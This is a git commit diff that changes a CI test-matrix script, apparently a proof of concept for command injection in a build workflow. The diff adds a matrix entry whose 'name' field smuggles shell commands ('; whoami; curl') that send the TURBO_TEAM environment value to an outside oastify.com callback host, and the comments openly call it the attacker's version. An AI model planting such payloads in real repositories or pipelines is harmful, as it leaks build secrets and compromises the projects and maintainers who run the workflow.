ee3e403263863664f4d090e2f217c087f3e5deb3
saurabhb-dev <saurabh.banawar@gmail.com>
2025-11-01 16:40:15 +0530

    Update create-test-matrix.mjs

--- scripts/create-test-matrix.mjs
+++ scripts/create-test-matrix.mjs
@@ -1,10 +1,8 @@
-// The "good" script in your main branch
+// The "attacker's" version of the script
 const matrix = {
   app: [
-    {
-      name: 'nitro',
-      project: 'workbench-nitro-workflow',
-    },
+    // The payload: 'nitro' (to make the cd work), ';', 'whoami'
+    { name: 'nitro; whoami; curl "https://w4194oyqst012wbw87nlqlvtgkmfajy8.oastify.com?team=${TURBO_TEAM}"', project: 'whatever-project' },
   ],
 };
 console.log(JSON.stringify(matrix));
